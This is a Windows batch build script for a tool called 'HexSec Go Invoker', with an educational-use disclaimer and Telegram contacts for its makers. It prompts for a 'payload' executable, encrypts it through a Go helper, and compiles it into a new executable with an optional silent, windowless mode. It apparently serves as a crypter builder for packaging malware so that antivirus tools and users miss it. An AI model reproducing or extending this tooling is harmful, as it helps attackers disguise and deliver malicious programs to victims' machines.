@echo off
setlocal enabledelayedexpansion
title HexSec Go Invoker v1.0

REM ================= DISCLAIMER =====================
echo =================================================
echo  This script and its associated tools are strictly
echo  provided for EDUCATIONAL and RESEARCH purposes.
echo  Any misuse of this tool is solely the responsibility
echo  of the end user. The developers take no liability
echo  for any damage caused.
echo =================================================
echo.


REM Display ASCII logo
echo "+-------------------------------------------------+";
echo "|  ____         ___                 _             |";
echo "| / ___| ___   |_ _|_ ____   _____ | | _____ _ __ |";
echo "|| |  _ / _ \   | || '_ \ \ / / _ \| |/ / _ \ '__||";
echo "|| |_| | (_) |  | || | | \ V / (_) |   <  __/ |   |";
echo "| \____|\___/  |___|_| |_|\_/ \___/|_|\_\___|_|   |";
echo "|                                                 |";   
echo "| Contact on Telegram: @Hexsecteam                |";
echo "| Group on Telegram:  @hexsec_tools               |";
echo "+-------------------------------------------------+";
echo.

REM ====== Continue script logic here ======

set "logFile=build_encrypt.log"
echo [%date% %time%] === Build started === > "%logFile%"

REM Check if Go is installed
go version >nul 2>&1
if %errorlevel% neq 0 (
    echo [ERROR] Go is not installed or not added to PATH. >> "%logFile%"
    echo [ERROR] Go is not installed or not added to PATH.
    echo Download it from: https://go.dev/dl/ >> "%logFile%"
    echo Download it from: https://go.dev/dl/
    start https://go.dev/dl/
    exit /b
)

REM Ask for the payload path
set /p "payload=Give me Payload (.exe full path): "
echo Payload input: "%payload%" >> "%logFile%"

if "%payload%"=="" (
    echo [ERROR] No .exe file provided. >> "%logFile%"
    echo [ERROR] You must provide a valid path to a .exe file.
    exit /b
)

REM Ask for output name
echo.
set /p "outputName=Give output filename (without .exe, default: goinvoker): "
echo.
if "%outputName%"=="" (
    set "outputName=goinvoker"
    echo [INFO] No output name provided, using default: goinvoker >> "%logFile%"
    echo [INFO] No name provided, using default: goinvoker.exe
) else (
    echo Output name: "%outputName%" >> "%logFile%"
)

REM Ask for build mode with validation loop
:ask_mode
set /p "buildMode=Choose build mode - 1 for Silent GUI, 2 for Console App: "
if "%buildMode%"=="1" (
    set "ldflags=-ldflags=-H=windowsgui"
    echo [INFO] Silent GUI mode selected. >> "%logFile%"
) else if "%buildMode%"=="2" (
    set "ldflags="
    echo [INFO] Console app mode selected. >> "%logFile%"
) else (
    echo [ERROR] Invalid choice. Please enter 1 or 2.
    goto ask_mode
)

echo.

REM Run go mod tidy
echo Running go mod tidy... >> "%logFile%"
go mod tidy >> "%logFile%" 2>&1

REM Run the encryption helper
echo Running helper encryption... >> "%logFile%"
go run helper/helper.go -file="%payload%" >> "%logFile%" 2>&1

REM Set build environment
set GOOS=windows
set GOARCH=amd64

REM Build the output executable
echo Building "%outputName%.exe"... >> "%logFile%"
go build %ldflags% -o "%outputName%.exe" >> "%logFile%" 2>&1

if exist "%cd%\%outputName%.exe" (
    echo Build success: "%cd%\%outputName%.exe" >> "%logFile%"
    echo The file has been encrypted and saved as:
    echo "%cd%\%outputName%.exe"
) else (
    echo [ERROR] Build failed. >> "%logFile%"
    echo [ERROR] Something went wrong during build.
)

echo [%date% %time%] === Build ended === >> "%logFile%"
echo.
pause
